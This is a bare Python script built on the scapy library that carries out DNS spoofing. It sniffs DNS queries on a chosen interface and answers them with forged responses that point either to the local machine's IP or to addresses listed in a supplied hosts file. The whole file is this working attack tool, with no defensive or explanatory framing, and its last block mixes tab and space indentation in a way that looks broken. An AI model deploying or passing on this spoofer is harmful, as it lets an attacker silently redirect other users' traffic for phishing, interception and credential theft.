from optparse import OptionParser
from scapy.all import *
import netifaces as net


    
entries = {}
host = 0
parser = OptionParser()
parser.add_option("-i",  dest = "interface", default = "eth0")
parser.add_option("-f", dest = "hostnames")
options, args = parser.parse_args()
filters = ''

for i in args:
    filters = filters + i + ' '

filters = filters.rstrip()

net.ifaddresses(options.interface)
localIP = net.ifaddresses(options.interface)[net.AF_INET][0]['addr']

if options.hostnames:
    
    host = 1
    file = open(options.hostnames, 'r')
    for line in file:
        entry = line.split(" ")
        entries[entry[1].rstrip()] = entry[0]
    file.close()


def do_spoof_local(pkt):
	if(DNS in pkt and pkt[DNS].qr == 0):
		try:
			reqIP = pkt[IP]
			reqUDP = pkt[UDP]
			reqDNS = pkt[DNS]
			reqDNSQR = pkt[DNSQR]
			respIP = IP(src=reqIP.dst, dst=reqIP.src)
			respUDP = UDP(sport = reqUDP.dport, dport = reqUDP.sport)
			respDNSRR = DNSRR(rrname=pkt.getlayer(DNS).qd.qname, rdata = localIP)
			respDNS = DNS(qr=1,id=reqDNS.id, qd=reqDNSQR, an=respDNSRR)
			resp = respIP/respUDP/respDNS
		
			send(resp, iface = options.interface)
		except:
			print("error sending packet")
	
			
def do_spoof(pkt):
	if(DNS in pkt and pkt[DNS].qr == 0):
		for key,value in entries.items():
			if key in pkt.getlayer(DNS).qd.qname:
				reqIP = pkt[IP]
				reqUDP = pkt[UDP]
				reqDNS = pkt[DNS]
				reqDNSQR = pkt[DNSQR]
				respIP = IP(src=reqIP.dst, dst=reqIP.src)
				respUDP = UDP(sport = reqUDP.dport, dport = reqUDP.sport)
				respDNSRR = DNSRR(rrname=pkt.getlayer(DNS).qd.qname, rdata = value)
				respDNS = DNS(qr=1,id=reqDNS.id, qd=reqDNSQR, an=respDNSRR)
				resp = respIP/respUDP/respDNS
				send(resp, iface = options.interface)
				
	
					
			

if options.interface:
	if host == 0:
    		if args:
        		pkts = sniff(prn = do_spoof_local, iface = options.interface, filter = filters)
   		else:
        		pkts = sniff(prn = do_spoof_local, iface = options.interface)
	else:
		if args:
        		pkts = sniff(prn = do_spoof, iface = options.interface, filter = filters)

   		else:
        		pkts = sniff(prn = do_spoof, iface = options.interface)


